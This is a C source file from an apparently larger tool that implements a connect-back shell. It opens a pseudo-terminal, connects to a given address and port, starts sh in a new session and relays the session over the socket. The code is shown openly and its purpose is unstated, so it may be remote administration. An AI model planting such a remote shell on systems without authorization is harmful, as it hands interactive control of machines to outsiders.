/*
 * ============================================================================
 *
 *       Filename:  bash.c
 *
 *    Description:  
 *
 *        Version:  1.0
 *        Created:  2015年04月07日 15时15分13秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  jianxi sun (jianxi), ycsunjane@gmail.com
 *   Organization:  
 *
 * ============================================================================
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

/* posix_openpt */
#include <stdlib.h>
#include <fcntl.h>
/* sockaddr_in */
#include <netinet/in.h>
/* kill */
#include <signal.h>
#include <sys/wait.h>
/* prctl */
#include <sys/prctl.h>

#include "common.h"
#include "arg.h"
#define RETRYTIME	(10)

static int fd = -1;
static int ptm = -1;
static int bashpid;

static int bashfd(struct sockaddr_in *addr)
{
	int retry = 0;
	int fd = Socket(AF_INET, SOCK_STREAM, 0);
	if(fd < 0)
		return -1;

	socklen_t addr_len = sizeof(*addr);
	addr->sin_port = htons(args_info.bashport_arg);
reconnect:
	if(!connect(fd, (void *)addr, addr_len) && 
		tcp_alive(fd)) {
		sys_debug("connect success\n");
		return fd;
	} else {
		sys_debug("connect failed\n");
		if(retry++ < RETRYTIME) {
			sleep(1);
			goto reconnect;
		}
		return -1;
	}
}

static void clean_link()
{
	if(ptm >= 0) {
		close(ptm);
		ptm = -1;
	}
	if(fd >= 0) {
		close(fd);
		fd = -1;
	}
}

static void term_bash(int signum)
{
	sys_debug("kill sighup to bash: %d\n", bashpid);
	clean_link();
	exit(1);
}

static void term_tcp(int signum)
{
	sys_debug("SIGCHLD received\n");
	int status;
	pid_t pid = waitpid((pid_t)-1, &status, WNOHANG);
	sys_debug("child process %ld exited: %d\n",
		(long) pid, WEXITSTATUS(status));
	clean_link();
}

static void signal_init()
{
	/* SIGCHLD check bash exit */
	struct sigaction act;
	memset(&act, 0, sizeof(act));
	act.sa_handler = term_tcp;
	sigaction(SIGCHLD, &act, NULL);

	memset(&act, 0, sizeof(act));
	act.sa_handler = term_bash;
	sigaction(SIGPIPE, &act, NULL);
	sigaction(SIGTERM, &act, NULL);
}

static char *pty_init(int *pptm)
{
	int ptm = posix_openpt(O_RDWR);
	if(ptm < 0) {
		sys_warn("posix_openpt failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	}

	if(grantpt(ptm) < 0) {
		sys_warn("grantpt failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	}

	if(unlockpt(ptm) < 0){
		sys_warn("unlockpt failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	}

	char *name = ptsname(ptm);
	if(!name) {
		sys_warn("ptsname failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	}

	*pptm = ptm;

	return name;
}

void bashfrom(struct sockaddr_in *addr)
{
	pid_t pid;
	if( (pid = fork()) < 0) {
		sys_warn("Fork failed: %s(%d)\n", strerror(errno), errno);
		exit(-1);
	} else if(pid) {
		return;
	}

	/* child process */
	signal_init();
	char *ptsname = pty_init(&ptm);
	fd = bashfd(addr);
	if(fd < 0)
		goto end;

	if( (bashpid = fork()) < 0) {
		sys_warn("Fork failed: %s(%d)\n", 
			strerror(errno), errno);
		exit(-1);
	} else if(bashpid == 0) {
		if(setsid() < 0) {
			sys_warn("set new session id failed: %s(%d)\n",
				strerror(errno), errno);
			exit(-1);
		}
		int pts = open(ptsname, O_RDWR);
		if(pts < 0) {
			sys_warn("open %s failed: %s(%d)\n", 
				ptsname, strerror(errno), errno);
			exit(-1);
		}

		dup2(pts, 0);
		dup2(pts, 1);
		dup2(pts, 2);
		chdir(getenv("HOME"));
		if(execlp("sh", "sh", NULL) < 0) {
			sys_warn("Execlp failed: %s(%d)\n", 
				strerror(errno), errno);
			exit(-1);
		}
	} else {
		exchange(ptm, fd);
		kill(bashpid, SIGHUP);
		clean_link();
	}
end:
	exit(0);
}
